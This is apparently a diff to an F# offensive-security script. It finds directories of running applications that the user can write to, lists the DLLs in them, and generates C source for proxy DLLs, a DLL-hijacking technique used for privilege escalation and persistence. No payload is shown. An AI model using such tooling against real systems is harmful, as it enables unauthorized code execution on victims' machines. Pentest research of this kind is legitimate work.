@@ -1,4 +1,5 @@
-﻿open System.Diagnostics
+﻿open System
+open System.Diagnostics
 open System.DirectoryServices.AccountManagement
 open System.IO
 open System.Management
@@ -70,12 +71,28 @@ let writableDirectories =
 
 printfn $"[*] There are %d{Seq.length writableDirectories} directories from running applications we can write to."
 
-let displayDlls path =
-    let dlls = Dll.getDlls path
-
+let displayDlls path dlls =
     if Seq.length dlls <> 0 then
         printfn $"[+] There are %d{Seq.length dlls} DLLs we can use for %s{path}"
 
     dlls |> Seq.iter (fun dll -> printfn $"\t- %s{dll}")
+   
 
-writableDirectories |> Seq.iter displayDlls
+let mutable createdProxies = [||]
+
+let dlls = writableDirectories |> Seq.map Dll.getDlls
+               
+Seq.iter2 displayDlls writableDirectories dlls
+
+let createProxy = 
+    if not (Directory.Exists("Output")) then
+        Directory.CreateDirectory("Output") |> ignore
+        
+    for dllFiles in dlls do
+        for dll in dllFiles do
+            let filePath = Path.Join("Output", dll.Replace(".dll", ".c", StringComparison.OrdinalIgnoreCase))
+            if not (createdProxies |> Seq.contains filePath) then
+                let result = Dll.proxyDll dll
+                File.WriteAllText(filePath, result)
+                createdProxies <- Array.append createdProxies [|filePath|]
+                printfn $"[*] Created proxy for %s{Path.GetFileName(filePath)}"
